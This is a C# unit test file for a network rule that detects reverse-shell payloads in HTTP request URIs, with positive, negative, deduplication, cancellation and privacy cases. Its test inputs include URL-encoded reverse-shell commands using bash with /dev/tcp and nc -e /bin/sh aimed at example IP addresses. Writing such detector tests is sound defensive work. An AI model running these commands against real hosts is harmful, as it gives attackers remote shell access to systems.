// SPDX-License-Identifier: MIT
using System;
using System.Threading;
using System.Threading.Tasks;
using Carthago.Engine.Rules.Payloads;
using Xunit;
namespace Carthago.Tests;
public sealed class R090AdvancedAccuracyBatchTests
{
    private readonly R090_ReverseShellPayloadIndicatorRule _rule=new();
    private const string Exploit="/api?run=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F203.0.113.5%2F4444";
    private async Task<bool> Seen(int t,string uri=Exploit,string? info=null)
        =>(await _rule.EvaluateAsync(NetworkBatch081085Context.Http(t,uri,info:info))).Matched;
    [Fact] public async Task Structured_Bash_Reverse_Shell_Command_Matches()
    {Assert.True(await Seen(1));}
    [Fact] public async Task Alternate_Ncat_Execution_Form_Matches()
    {Assert.True(await Seen(1,uri:"/run?x=nc%20-e%20%2Fbin%2Fsh%2010.1.2.3%204444"));}
    [Fact] public async Task ReverseShell_Documentation_And_Normal_Shell_Usage_Do_Not_Trigger()
    {
        Assert.False(await Seen(1,uri:"/docs?q=reverse%20shell"));
        Assert.False(await Seen(2,uri:"/admin?q=bash%20-i"));
        Assert.False(await Seen(3,uri:"/help?q=/dev/tcp/"));
    }
    [Fact] public async Task Untrusted_Info_Keywords_Are_Not_Payload()
    {Assert.False(await Seen(1,uri:"/safe",info:"reverse shell bash -i /dev/tcp/203.0.113.5/4444"));}
    [Fact] public async Task Incomplete_Or_Contradictory_Capture_Is_NonEvidence()
    {
        var c=NetworkBatch081085Context.Http(1,Exploit);c.Record.HttpMethod=null;
        Assert.False((await _rule.EvaluateAsync(c)).Matched);
        c=NetworkBatch081085Context.Http(2,Exploit);c.Record.IsQuic=true;
        Assert.False((await _rule.EvaluateAsync(c)).Matched);
        c=NetworkBatch081085Context.Http(3,Exploit);c.Record.Length=0;
        Assert.False((await _rule.EvaluateAsync(c)).Matched);
        c=NetworkBatch081085Context.Http(4,Exploit);c.Record.HttpRequestHeaders="Host: bad.example.test\r\n\r\n";
        Assert.False((await _rule.EvaluateAsync(c)).Matched);
    }
    [Fact] public async Task Replay_Deduplication_Does_Not_Block_New_Evidence()
    {
        var c=NetworkBatch081085Context.Http(1,Exploit);
        Assert.True((await _rule.EvaluateAsync(c)).Matched);
        Assert.False((await _rule.EvaluateAsync(c)).Matched);
        Assert.True(await Seen(2));
    }
    [Fact] public async Task Cancellation_Long_Uri_And_Alert_Privacy_Hold()
    {
        using var cts=new CancellationTokenSource();cts.Cancel();
        await Assert.ThrowsAnyAsync<OperationCanceledException>(async()=>await _rule.EvaluateAsync(NetworkBatch081085Context.Http(1,Exploit),cts.Token));
        Assert.False(await Seen(2,uri:"/q?big="+new string('z',4200)+Exploit));
        var e=Assert.Single((await _rule.EvaluateAsync(NetworkBatch081085Context.Http(3,Exploit+"&token=secret90"))).Events);
        Assert.DoesNotContain("secret90",e.Description);Assert.DoesNotContain("secret90",e.Evidence);
    }
}
